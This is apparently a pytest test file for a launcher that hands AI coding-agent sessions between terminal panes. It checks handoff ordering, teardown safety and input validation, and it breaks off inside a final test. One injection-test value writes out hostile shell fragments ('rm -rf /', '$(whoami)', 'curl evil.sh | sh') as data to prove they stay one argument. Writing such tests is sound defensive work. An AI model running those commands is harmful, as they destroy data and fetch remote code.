"""Tests for the herdr launcher mode (#611, epic #667).

Rewritten after the Step-8a cross-model review returned FAIL on the first attempt. The two
findings that shaped this file:

1. **The first attempt was disconnected builders, not a launcher.** `handoff_plan` returned a
   step whose argv was `None`, nothing read the artifacts it named, and no non-test caller
   existed. So the centrepiece here is `TestPerformHandoff`, which drives the WIRED
   `perform_handoff` end to end through an injected runner and injected readers — proving the
   ordered sequence, the abort-at-first-failure behaviour, and that teardown really is last.
2. **Arming `/goal` at birth was falsified.** herdr rejects a control character in a native
   agent argument, and a real condition is multiline. So `build_agent_start_argv` now carries
   NO goal, and `test_agent_start_never_carries_the_goal` pins that; the goal is armed after
   readiness via the proven send-text route.

The regression that would hurt most and show least is a return to `--current`: it resolves
fine interactively and fails only under cron, i.e. only unattended, i.e. only where nobody is
watching. `test_split_never_uses_current` exists for that.
"""
from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
HOOKS = REPO_ROOT / "hooks"
CLI = HOOKS / "launcher_lib.py"

if str(HOOKS) not in sys.path:
    sys.path.insert(0, str(HOOKS))

import launcher_lib as ll  # noqa: E402


class FakeProc:
    def __init__(self, returncode=0, stdout=""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = ""


class Runner:
    """Records every argv it is handed and replays canned responses by command shape."""

    def __init__(self, responses=None, fail_on=None):
        self.calls: list[list[str]] = []
        self.responses = responses or {}
        self.fail_on = fail_on

    def key(self, argv):
        return " ".join(argv[:3])

    def __call__(self, argv, timeout=180):
        assert isinstance(argv, list) and all(isinstance(a, str) for a in argv), \
            "runner must only ever receive a list[str] argv — never a shell string"
        self.calls.append(list(argv))
        k = self.key(argv)
        if self.fail_on and k.startswith(self.fail_on):
            return FakeProc(returncode=1)
        if k == "herdr pane list" and k not in self.responses:
            # Default inventory: only the predecessor exists, so an uncertain split reconciles
            # to "nothing was created". Tests that exercise the reconcile supply their own.
            return FakeProc(0, PANE_LIST_ANCHOR_ONLY)
        return FakeProc(0, self.responses.get(k, ""))

    def kinds(self):
        return [self.key(a) for a in self.calls]


SPLIT_OK = json.dumps({"result": {"pane_id": "w1:pZZ"}})
PANE_LIST_ANCHOR_ONLY = json.dumps({"result": {"panes": [{"pane_id": "w1:p1"}]}})
PANE_GET_OK = json.dumps({"result": {"pane": {
    "pane_id": "w1:pZZ",
    "agent_session": {"agent": "claude", "kind": "id", "source": "herdr:claude",
                      "value": "sess-new-123"}}}})
REGISTRY_OK = '{"session_id":"sess-new-123","project":"rawgentic"}\n'
GOAL_FIXTURE = REPO_ROOT / "tests" / "fixtures" / "herdr" / "goal_status_transcript.jsonl"
TRANSCRIPT_OK = GOAL_FIXTURE.read_text(encoding="utf-8")
GOAL_CONDITION = ("PR open with green CI, or a blocker is posted to the issue via the ERROR "
                  "protocol")
RESUME_PROMPT = "Fresh-session resume for epic #667. Re-bind the project and run the next child."
REGISTRY_PATH = "/reg.jsonl"


class Artifacts:
    """Models the two on-disk artifacts as they really behave over a launch.

    #611 Step-11 Medium 4: the evidence that authorises predecessor teardown must be
    *launch-bound*. Before the launch each artifact holds whatever history it already had
    (``*_pre``); the successor's own rows appear only afterwards. ``perform_handoff`` captures a
    pre-launch offset and may only count what lands AFTER it — so seeding ``registry_pre`` with a
    matching row must NOT satisfy the check.

    ``appear_after`` is the number of reads that still return only the pre-launch content, which
    lets a test drive the bounded-polling path deterministically.
    """

    def __init__(self, registry=REGISTRY_OK, transcript=TRANSCRIPT_OK,
                 registry_pre="", transcript_pre="", appear_after=1):
        self.registry, self.transcript = registry, transcript
        self.registry_pre, self.transcript_pre = registry_pre, transcript_pre
        self.appear_after = appear_after
        self.reads: dict[str, int] = {}

    def __call__(self, path):
        n = self.reads.get(path, 0) + 1
        self.reads[path] = n
        pre, post = ((self.registry_pre, self.registry) if path == REGISTRY_PATH
                     else (self.transcript_pre, self.transcript))
        return pre + (post if n > self.appear_after else "")


def _predecessor_closed(runner) -> bool:
    """True if the PREDECESSOR pane was closed. On any failed handoff this must stay False —
    the predecessor has to remain alive AND still guarded. Closing the tentative SUCCESSOR is
    correct cleanup and is asserted separately."""
    return any(c[:3] == ["herdr", "pane", "close"] and c[3] == "w1:p1" for c in runner.calls)


def _handoff(**over):
    kw = dict(
        anchor_pane="w1:p1", cwd=str(REPO_ROOT), project_root=str(REPO_ROOT),
        name="child4", goal_condition=GOAL_CONDITION, resume_prompt=RESUME_PROMPT,
        registry_path=REGISTRY_PATH, transcript_path_for=lambda s: f"/t/{s}.jsonl",
        read_text=Artifacts(), sleeper=lambda _s: None,
    )
    kw.update(over)
    return kw


def _sent(runner) -> list[str]:
    """The text of every `herdr pane send-text`, in order."""
    return [c[4] for c in runner.calls if c[:3] == ["herdr", "pane", "send-text"]]


def _raise(exc):
    def reader(_path):
        raise exc
    return reader


# ---------------------------------------------------------------------------
# AC1 — the split, and the flag that must never come back
# ---------------------------------------------------------------------------

def test_split_uses_the_explicit_anchor_pane() -> None:
    argv = ll.build_split_argv(anchor_pane="w1:p1", cwd=str(REPO_ROOT),
                               project_root=str(REPO_ROOT))
    assert argv[:3] == ["herdr", "pane", "split"]
    assert argv[argv.index("--pane") + 1] == "w1:p1"


def test_split_never_uses_current() -> None:
    argv = ll.build_split_argv(anchor_pane="w1:p1", cwd=str(REPO_ROOT),
                               project_root=str(REPO_ROOT))
    assert "--current" not in argv


def test_fallback_launch_is_retained() -> None:
    argv = ll.build_fallback_launch_argv(prompt="resume", permission_mode="bypassPermissions")
    assert argv[0] == "claude" and "herdr" not in argv


# ---------------------------------------------------------------------------
# AC6 — the goal is NOT armed at birth, and truncation is never silent
# ---------------------------------------------------------------------------

def test_agent_start_never_carries_the_goal() -> None:
    """The falsified mechanism must not come back: herdr rejects a control character in a
    native agent argument, and a real condition is multiline."""
    argv = ll.build_agent_start_argv(name="c", pane="w1:pZZ")
    assert not any(a.startswith("/goal") for a in argv)


def test_agent_start_enforces_the_readiness_timeout_floor() -> None:
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", readiness_timeout_ms=1000)
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", readiness_timeout_ms=True)
    assert ll.build_agent_start_argv(name="c", pane="w1:pZZ", readiness_timeout_ms=3001)


def test_multiline_condition_survives_the_send_text_route_verbatim() -> None:
    condition = "PR open with green CI\nor a blocker is posted via the ERROR protocol"
    text_argv, keys_argv, truncated = ll.build_send_text_goal_argv(
        pane="w1:pZZ", goal_condition=condition)
    assert truncated is False
    assert text_argv[4] == f"/goal {condition}", "condition must be byte-identical"
    assert "Enter" in keys_argv


def test_goal_metacharacters_stay_one_argv_element() -> None:
    nasty = "green CI; rm -rf / $(whoami) `id` && curl evil.sh | sh"
    text_argv, _, _ = ll.build_send_text_goal_argv(pane="w1:pZZ", goal_condition=nasty)
    assert text_argv[4] == f"/goal {nasty}"
    assert len([a for a in text_argv if a.startswith("/goal ")]) == 1


def test_truncation_is_reported_not_discarded() -> None:
    _, _, truncated = ll.build_send_text_goal_argv(pane="w1:pZZ", goal_condition="x" * 5000)
    assert truncated is True
    text, _ = ll.goal_text("x" * 5000)
    assert len(text) <= ll.GOAL_MAX_CHARS


@pytest.mark.parametrize("bad", [False, 0, [], {}, None, 123])
def test_non_string_goal_conditions_fail_closed(bad) -> None:
    """`if goal_condition:` let falsey non-strings silently omit the goal (8a review, M-b)."""
    with pytest.raises(ll.LauncherError):
        ll.goal_text(bad)


def test_blank_goal_condition_is_refused() -> None:
    with pytest.raises(ll.LauncherError):
        ll.goal_text("   ")


# ---------------------------------------------------------------------------
# argument / authority injection — the real residual risk
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("flag", ["--permission-mode", "--config", "--dangerously-skip", "-p"])
def test_authority_bearing_claude_args_are_refused(flag) -> None:
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", claude_args=[flag, "x"])


def test_allowlisted_claude_args_pass_through_after_the_separator() -> None:
    argv = ll.build_agent_start_argv(name="c", pane="w1:pZZ", claude_args=["--continue"])
    assert argv[argv.index("--") + 1] == "--continue"


def test_print_is_not_allowlisted_on_the_interactive_path() -> None:
    """`--print` is non-interactive; `herdr agent start` needs an interactive agent, so
    allowing it would pass local validation and fail only after a pane exists."""
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", claude_args=["--print"])


def test_control_characters_are_refused_everywhere_they_matter() -> None:
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", claude_args=["--continue\n"])
    with pytest.raises(ll.LauncherError):
        ll.validate_pane_id("w1:p\x01")


def test_cwd_is_confined_below_the_project_root() -> None:
    with pytest.raises(ll.LauncherError):
        ll.build_split_argv(anchor_pane="w1:p1", cwd="/etc", project_root=str(REPO_ROOT))
    with pytest.raises(ll.LauncherError):
        ll.build_split_argv(anchor_pane="w1:p1", cwd="../..", project_root=str(REPO_ROOT))
    assert ll.build_split_argv(anchor_pane="w1:p1", cwd="hooks", project_root=str(REPO_ROOT))


@pytest.mark.parametrize("bad", ["--current", "-x", "", "w1:p1 x", "w1:p1;id", "w" * 200])
def test_malformed_pane_ids_are_refused(bad) -> None:
    with pytest.raises(ll.LauncherError):
        ll.validate_pane_id(bad)


def test_pane_id_regex_rejects_unicode_digits() -> None:
    """`\\d` admitted `w١:p1`; the charset is explicit now (8a review, Low)."""
    with pytest.raises(ll.LauncherError):
        ll.validate_pane_id("w١:p1")


@pytest.mark.parametrize("bad", ["-evil", "", "a b", "x" * 200, "Child4", "9lives", "has.dot"])
def test_malformed_agent_names_are_refused(bad) -> None:
    with pytest.raises(ll.LauncherError):
        ll.validate_agent_name(bad)


# ---------------------------------------------------------------------------
# mode selection — must not hand out a successor known to be unusable
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("backend,avail,supports,expected", [
    ("herdr", True, True, "herdr"),
    ("herdr", False, True, "single_session"),
    ("herdr", True, False, "single_session"),
    ("tmux", True, True, "pane_less"),
    (None, False, False, "pane_less"),
])
def test_mode_selection_matches_the_driver_lib_contract(backend, avail, supports, expected):
    """A herdr-gated project that cannot get a pane keeps the single-session loop rather than
    launching a pane-less successor that would die at its first build-seat dispatch
    (8a review, M-c; mirrors driver_lib.fresh_session_available)."""
    mode, reason = ll.select_launch_mode(terminal_backend=backend, herdr_available=avail,
                                         launcher_supports_herdr=supports)
    assert mode == expected
    assert reason.strip()


# ---------------------------------------------------------------------------
# AC7 — the readers actually read
# ---------------------------------------------------------------------------

def test_pane_agent_session_is_parsed_from_a_real_shaped_response() -> None:
    assert ll.parse_pane_agent_session(PANE_GET_OK) == "sess-new-123"


@pytest.mark.parametrize("bad", ["", "not json", "{}", json.dumps({"result": {"pane": {}}}),
                                 json.dumps({"result": {"pane": {"agent_session": {}}}})])
def test_absent_agent_session_reads_as_none_not_success(bad) -> None:
    assert ll.parse_pane_agent_session(bad) is None


def test_registry_match_requires_the_new_session_id() -> None:
    assert ll.registry_has_session(REGISTRY_OK, "sess-new-123") is True
    assert ll.registry_has_session(REGISTRY_OK, "sess-old-999") is False
    assert ll.registry_has_session("garbage\n", "sess-new-123") is False


def test_goal_armed_reads_the_REAL_transcript_shape() -> None:
    """The critical regression (#611 Step-11 High 2).

    An earlier revision matched `{"goal_status": {"met": false}}` — a shape this repo
    INVENTED, which its own tests then fed back. Against real output the check always
    returned False, so `goal_armed` could never pass and teardown could never fire. The
    fixture is real-shaped (`attachment.type == "goal_status"`), verified against live
    transcripts, so the invented shape cannot come back unnoticed.
    """
    assert ll.transcript_has_unmet_goal(TRANSCRIPT_OK) is True
    assert "\"attachment\"" in TRANSCRIPT_OK and '"type":"goal_status"' in TRANSCRIPT_OK
    met_only = "\n".join(l for l in TRANSCRIPT_OK.splitlines() if '"met":true' in l)
    assert met_only, "fixture must carry a met:true line to test against"
    assert ll.transcript_has_unmet_goal(met_only) is False, \
        "an already-met goal does not prove the successor is guarded"
    assert ll.transcript_has_unmet_goal("") is False
    assert ll.transcript_has_unmet_goal('{"goal_status":{"met":false}}') is False, \
        "the invented shape must NOT be accepted"


def test_ladder_is_ordered_and_names_on_disk_artifacts() -> None:
    """The order is CAUSAL, not alphabetical: the guard is armed before the successor is given
    work, and the registry row can only appear once the resume prompt has made it run
    `/rawgentic:switch`. Checking `project_switched` before the resume prompt is even sent is
    what the second revision did, and it could only ever have passed on stale evidence."""
    steps = ll.handoff_verification_steps()
    assert [s["step"] for s in steps] == ["spawned", "goal_armed", "project_switched"]
    for s in steps:
        assert s["artifact"].strip()
        assert "pane text" not in s["artifact"].lower()


def test_ladder_aborts_at_the_first_failure() -> None:
    ok, failed, checked = ll.evaluate_verifications(
        {"spawned": True, "goal_armed": False, "project_switched": True})
    assert (ok, failed, checked) == (False, "goal_armed", ["spawned", "goal_armed"])


def test_missing_result_is_failure_not_pass() -> None:
    ok, failed, _ = ll.evaluate_verifications({"spawned": True})
    assert ok is False and failed == "goal_armed"


def test_teardown_refused_until_every_check_passes() -> None:
    allowed, reason = ll.teardown_allowed({"spawned": True, "project_switched": True,
                                           "goal_armed": False})
    assert allowed is False and "goal_armed" in reason


# ---------------------------------------------------------------------------
# the wired path — this is what the review found missing
# ---------------------------------------------------------------------------

class TestPerformHandoff:
    def test_happy_path_runs_the_full_ordered_sequence(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        assert out["new_pane"] == "w1:pZZ"
        assert out["session_id"] == "sess-new-123"
        assert out["results"] == {"spawned": True, "goal_armed": True,
                                  "project_switched": True}
        assert r.kinds() == [
            "herdr pane list",                                  # pre-split inventory
            "herdr pane split", "herdr agent start", "herdr agent wait", "herdr pane get",
            "herdr pane send-text", "herdr pane send-keys",     # the goal
            "herdr pane send-text", "herdr pane send-keys",     # the resume prompt
            "herdr pane close",                                 # the predecessor, LAST
        ]
        assert out["cleanup"] is None, "nothing to clean up when ownership transferred"

    def test_teardown_is_the_final_call(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        ll.perform_handoff(runner=r, **_handoff())
        assert r.kinds()[-1] == "herdr pane close"
        assert r.kinds().count("herdr pane close") == 1

    def test_goal_is_pasted_only_after_readiness(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        ll.perform_handoff(runner=r, **_handoff())
        kinds = r.kinds()
        assert kinds.index("herdr agent wait") < kinds.index("herdr pane send-text")

    @pytest.mark.parametrize("fail_at,expected", [
        ("herdr pane split", "split"),
        ("herdr agent start", "agent_start"),
        ("herdr agent wait", "agent_wait"),
        ("herdr pane send-text", "send_text"),
    ])
    def test_a_failed_step_aborts_and_never_tears_down(self, fail_at, expected) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK},
                   fail_on=fail_at)
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False
        assert out["failed_step"] == expected
        assert not _predecessor_closed(r), \
            "the predecessor must stay alive AND guarded when the handoff fails"
        if out["new_pane"]:
            # a pane was created, so it must have been cleaned up; when the SPLIT itself
            # failed there is nothing to clean up and `cleanup` is correctly None
            assert out["cleanup"] and "closed tentative pane" in out["cleanup"], \
                f"{fail_at}: tentative successor leaked"
        else:
            assert out["cleanup"] is None

    def test_unparseable_split_response_aborts(self) -> None:
        r = Runner({"herdr pane split": "not json"})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "split_response_unparseable"
        # no pane id was parsed, so there is nothing to clean up and nothing to retire
        assert not _predecessor_closed(r) and out["cleanup"] is None

    def test_absent_agent_session_blocks_teardown(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK,
                    "herdr pane get": json.dumps({"result": {"pane": {}}})})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "spawned"
        assert not _predecessor_closed(r)

    def test_registry_without_the_new_session_blocks_teardown(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(registry='{"session_id":"someone-else"}\n')))
        assert out["ok"] is False and out["failed_step"] == "project_switched"
        assert not _predecessor_closed(r)

    def test_unarmed_goal_blocks_teardown(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=lambda p: REGISTRY_OK if p == "/reg.jsonl" else ""))
        assert out["ok"] is False and out["failed_step"] == "goal_armed"
        assert not _predecessor_closed(r)

    def test_unreadable_artifact_is_a_failure_not_a_pass(self) -> None:
        def boom(path):
            raise OSError("gone")
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=boom))
        assert out["ok"] is False
        assert not _predecessor_closed(r)

    def test_truncation_is_surfaced_on_the_wired_path(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(goal_condition="x" * 5000))
        assert out["truncated"] is True
        note = [s for s in out["steps"] if s["kind"] == "send_text"][0]["note"]
        assert note and "TRUNCATED" in note

    def test_runner_only_ever_receives_argv_lists(self) -> None:
        """The Runner asserts this on every call; this test makes the guarantee explicit."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        ll.perform_handoff(runner=r, **_handoff())
        assert r.calls and all(isinstance(c, list) for c in r.calls)


# ---------------------------------------------------------------------------
# CLI (black-box via subprocess, per docs/testing.md)
# ---------------------------------------------------------------------------

def _cli(*args: str) -> subprocess.CompletedProcess:
    return subprocess.run([sys.executable, str(CLI), *args], capture_output=True,
                          text=True, check=False)


def test_cli_absent_capability_flag_does_not_read_as_support() -> None:
    """`store_true` with `default=True` made the flag a no-op (8a review, M-a)."""
    proc = _cli("select-mode", "--terminal-backend", "herdr", "--herdr-available")
    assert proc.returncode == 0, proc.stderr
    assert "single_session" in proc.stdout


def test_cli_with_capability_flag_selects_herdr() -> None:
    proc = _cli("select-mode", "--terminal-backend", "herdr", "--herdr-available",
                "--launcher-herdr")
    assert proc.returncode == 0 and "herdr\t" in proc.stdout


def test_cli_build_split_emits_argv_without_current() -> None:
    proc = _cli("build-split", "--anchor-pane", "w1:p1", "--cwd", str(REPO_ROOT),
                "--project-root", str(REPO_ROOT))
    assert proc.returncode == 0, proc.stderr
    assert "--current" not in json.loads(proc.stdout)


def test_cli_rejects_cwd_outside_the_project_root() -> None:
    proc = _cli("build-split", "--anchor-pane", "w1:p1", "--cwd", "/etc",
                "--project-root", str(REPO_ROOT))
    assert proc.returncode == 2 and "outside the project root" in proc.stderr


def test_cli_build_fallback_gives_the_pane_less_path_an_entry_point() -> None:
    """AC1's second half. Without this the builder had no caller at all — the disconnected
    smell the Step-8a review named."""
    proc = _cli("build-fallback", "--prompt", "resume", "--wall-timeout", "5h")
    assert proc.returncode == 0, proc.stderr
    argv = json.loads(proc.stdout)
    assert argv[:2] == ["timeout", "5h"] and "herdr" not in argv


def test_cli_goal_text_reports_truncation() -> None:
    proc = _cli("goal-text", "--condition", "x" * 5000)
    assert proc.returncode == 0
    assert json.loads(proc.stdout)["truncated"] is True


# ---------------------------------------------------------------------------
# #611 Step-11 High 1 — the production caller
# ---------------------------------------------------------------------------

def _state(tmp_path, **over):
    state = {"campaign": "epic-667", "epic": 667, "generation": 3,
             "session_mode": "fresh-session",
             "issues": [{"number": 611, "status": "merged"},
                        {"number": 612, "status": "queued"}]}
    state.update(over)
    p = tmp_path / "driver-state.json"
    p.write_text(json.dumps(state), encoding="utf-8")
    return p


def _handoff_argv(state, tmp_path, **over):
    kw = {"--driver-state": str(state), "--anchor-pane": "w1:p1", "--name": "child4",
          "--project-root": str(REPO_ROOT), "--cwd": str(REPO_ROOT),
          "--registry": "/reg.jsonl", "--transcript-dir": str(tmp_path),
          "--goal-condition": "keep going", "--launch-mode": "fresh",
          "--herdr-mode": "herdr"}
    kw.update(over)
    argv = ["handoff"]
    for k, v in kw.items():
        argv += [k] if v is None else [k, v]
    return argv


class TestHandoffCLI:
    """#611 Step-11 High 1 (conf 1.00): `rg` found no non-test invocation of `perform_handoff`
    — the module was builders nobody called. This subcommand IS the caller; the workspace
    `*-resume.sh` launcher invokes it (the launchers live outside any git repo, so the logic
    lives here where it can be tested and shipped — D-11 finding 2)."""

    def test_the_subcommand_exists(self) -> None:
        proc = _cli("handoff", "--help")
        assert proc.returncode == 0
        assert "--driver-state" in proc.stdout and "--anchor-pane" in proc.stdout

    def test_a_campaign_with_nothing_ready_refuses_without_touching_herdr(self, tmp_path) -> None:
        """Every child merged => `complete`, not `ready`. Splitting a pane here would spawn a
        successor with no work at all."""
        state = _state(tmp_path, issues=[{"number": 611, "status": "merged"}])
        proc = _cli(*_handoff_argv(state, tmp_path))
        assert proc.returncode == 3, proc.stderr
        assert "complete" in (proc.stdout + proc.stderr)

    @pytest.mark.parametrize("mode", ["single_session", "pane_less"])
    def test_only_the_herdr_verdict_runs_this_sequence(self, tmp_path, mode) -> None:
        """`single_session` means keep the current loop; `pane_less` means use the retained
        `claude --print` path. Accepting either here would split a pane on a project that never
        wanted one and then retire the predecessor after launching by a different mechanism
        entirely (#611 Step-11 pass-3 Medium 4)."""
        proc = _cli(*_handoff_argv(_state(tmp_path), tmp_path, **{"--herdr-mode": mode}))
        assert proc.returncode == 2, proc.stdout
        assert "invalid choice" in proc.stderr

    def test_a_single_session_campaign_is_not_handed_off(self, tmp_path) -> None:
        """A driver-state with no `session_mode` is documented to mean byte-identical
        single-session behaviour. The previous revision forced FRESH_SESSION_MODE, so it would
        have launched a successor and retired the predecessor for such a campaign
        (#611 Step-11 pass-3 High 2)."""
        state = _state(tmp_path)
        payload = json.loads(state.read_text(encoding="utf-8"))
        del payload["session_mode"]
        state.write_text(json.dumps(payload), encoding="utf-8")
        proc = _cli(*_handoff_argv(state, tmp_path))
        assert proc.returncode == 3, proc.stdout
        assert "single_session" in proc.stdout

    def test_an_unarmed_launcher_is_refused(self, tmp_path) -> None:
        """Absence of the assertion must not read as support — the same lesson the 8a review
        taught about `--launcher-herdr`."""
        proc = _cli(*_handoff_argv(_state(tmp_path), tmp_path))
        assert proc.returncode == 3, proc.stdout
        assert "launcher" in proc.stdout.lower()

    def test_a_resume_first_launcher_is_refused(self, tmp_path) -> None:
        proc = _cli(*_handoff_argv(_state(tmp_path), tmp_path, **{"--launcher-armed": None}))
        assert proc.returncode == 3, proc.stdout
        assert "fresh" in proc.stdout.lower()

    def test_the_resume_prompt_comes_from_driver_lib_not_a_hand_written_string(self,
                                                                               tmp_path) -> None:
        """AC6's sibling requirement: the successor is told to rebuild from durable state. The
        canonical wording is `driver_lib`'s, so the two cannot drift apart."""
        sys.path.insert(0, str(HOOKS))
        import driver_lib as dl  # noqa: PLC0415

        state = json.loads(_state(tmp_path).read_text(encoding="utf-8"))
        disposition = dl.fresh_session_handoff(state, mode=dl.FRESH_SESSION_MODE)
        assert disposition["outcome"] == "ready"
        assert ll.resume_prompt_for_state(state) == disposition["resume_prompt"]
        assert "612" in disposition["resume_prompt"]

    def test_the_condition_can_be_read_verbatim_from_a_transcript(self, tmp_path) -> None:
        """AC6: never retype or summarise the goal — read the predecessor's own last unmet row."""
        t = tmp_path / "pred.jsonl"
        t.write_text(TRANSCRIPT_OK, encoding="utf-8")
        proc = _cli("read-goal-condition", "--transcript", str(t))
        assert proc.returncode == 0, proc.stderr
        assert json.loads(proc.stdout)["condition"] == GOAL_CONDITION

    def test_no_unmet_goal_in_the_predecessor_is_an_explicit_refusal(self, tmp_path) -> None:
        t = tmp_path / "pred.jsonl"
        t.write_text('{"type":"user"}\n', encoding="utf-8")
        proc = _cli("read-goal-condition", "--transcript", str(t))
        assert proc.returncode == 3, proc.stdout
        assert "no unmet goal" in proc.stderr.lower()

    def test_the_cli_drives_perform_handoff_with_the_derived_prompt(self, tmp_path,
                                                                    monkeypatch) -> None:
        """In-process so the whole wiring is observable: driver-state -> disposition ->
        resume prompt -> perform_handoff. Without this, `handoff` could parse arguments
        perfectly and still never reach the sequence."""
        seen = {}

        def fake(**kw):
            seen.update(kw)
            return {"ok": True, "results": {}, "steps": [], "new_pane": "w1:pZZ",
                    "session_id": "s", "cleanup": None, "truncated": False,
                    "failed_step": None}

        monkeypatch.setattr(ll, "perform_handoff", fake)
        rc = ll.main(_handoff_argv(_state(tmp_path), tmp_path,
                                   **{"--launcher-armed": None,
                                      "--fresh-launch-supported": None}))
        assert rc == 0, seen
        assert seen["anchor_pane"] == "w1:p1"
        assert seen["goal_condition"] == "keep going"
        assert "612" in seen["resume_prompt"], "the successor must be told which child is next"
        assert seen["launch_mode"] == "fresh"
        assert callable(seen["transcript_path_for"])


class TestOwnershipDiscipline:
    """#611 Step-11 High 3 / Medium 5: a tentative successor pane must never be leaked, and a
    failed predecessor teardown must not be reported as a successful handoff."""

    def test_every_post_split_failure_closes_the_tentative_pane(self) -> None:
        for fail_at in ("herdr agent start", "herdr agent wait", "herdr pane send-text",
                        "herdr pane send-keys"):
            r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK},
                       fail_on=fail_at)
            out = ll.perform_handoff(runner=r, **_handoff())
            assert out["ok"] is False, fail_at
            assert "cleanup_tentative_pane" in [s["kind"] for s in out["steps"]], \
                f"{fail_at}: tentative pane leaked"
            closed = [c for c in r.calls if c[:3] == ["herdr", "pane", "close"]]
            assert closed and closed[0][3] == "w1:pZZ", f"{fail_at}: wrong pane closed"
            assert not any(c[3] == "w1:p1" for c in closed), \
                f"{fail_at}: predecessor must never be closed on a failed handoff"

    def test_failed_verification_also_closes_the_tentative_pane(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK,
                    "herdr pane get": json.dumps({"result": {"pane": {}}})})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "spawned"
        assert out["cleanup"] and "closed tentative pane" in out["cleanup"]

    def test_happy_path_does_not_close_the_successor(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True
        assert out["cleanup"] is None
        closed = [c for c in r.calls if c[:3] == ["herdr", "pane", "close"]]
        assert [c[3] for c in closed] == ["w1:p1"], "only the predecessor is retired"

    def test_a_failed_predecessor_teardown_is_not_reported_as_success(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK},
                   fail_on="herdr pane close")
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False
        assert out["failed_step"] == "teardown_predecessor"

    def test_bad_arguments_never_create_a_pane(self) -> None:
        """Validation happens before the split, so a refusal cannot leak a pane."""
        for over in ({"name": "-evil"}, {"goal_condition": "  "},
                     {"readiness_timeout_ms": 1000}, {"launch_mode": "--permission-mode"},
                     {"resume_prompt": "   "}):
            r = Runner({"herdr pane split": SPLIT_OK})
            with pytest.raises(ll.LauncherError):
                ll.perform_handoff(runner=r, **_handoff(**over))
            assert r.calls == [], f"{over}: a command ran before validation failed"

    def test_a_runner_exception_after_the_split_still_cleans_up(self) -> None:
        calls = []

        def boom(argv, timeout=180):
            calls.append(argv)
            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(0, SPLIT_OK)
            if argv[:3] == ["herdr", "pane", "close"]:
                return FakeProc(0)
            raise subprocess.SubprocessError("herdr died")

        out = ll.perform_handoff(runner=boom, **_handoff())
        assert out["ok"] is False
        assert any(c[:3] == ["herdr", "pane", "close"] and c[3] == "w1:pZZ" for c in calls)


# ---------------------------------------------------------------------------
# #611 Step-11 High 1 — the successor must actually be told to RESUME
# ---------------------------------------------------------------------------

class TestResumePrompt:
    """The second revision armed `/goal` and stopped there. A guarded session that is never
    given work just sits at an empty prompt: the goal only re-prompts once the session tries to
    STOP, so the run would stall silently and the predecessor would already be retired."""

    def test_resume_prompt_is_sent_after_the_goal(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        assert _sent(r) == [f"/goal {GOAL_CONDITION}", RESUME_PROMPT]

    def test_resume_prompt_waits_until_the_goal_is_VERIFIED_armed(self) -> None:
        """Not merely 'sent after' — sent after the on-disk goal_status row was observed. If the
        guard never armed, handing the successor work would start an UNGUARDED run."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(transcript="")))          # goal row never appears
        assert out["ok"] is False and out["failed_step"] == "goal_armed"
        assert _sent(r) == [f"/goal {GOAL_CONDITION}"], "resume prompt sent despite no guard"
        assert not _predecessor_closed(r)

    def test_a_handoff_with_no_resume_prompt_is_refused_before_anything_runs(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK})
        with pytest.raises(ll.LauncherError):
            ll.perform_handoff(runner=r, **_handoff(resume_prompt=""))
        assert r.calls == []

    def test_resume_prompt_step_is_named_in_the_output(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert "send_resume_prompt" in [s["kind"] for s in out["steps"]]

    def test_a_failed_resume_prompt_aborts_and_keeps_the_predecessor(self) -> None:
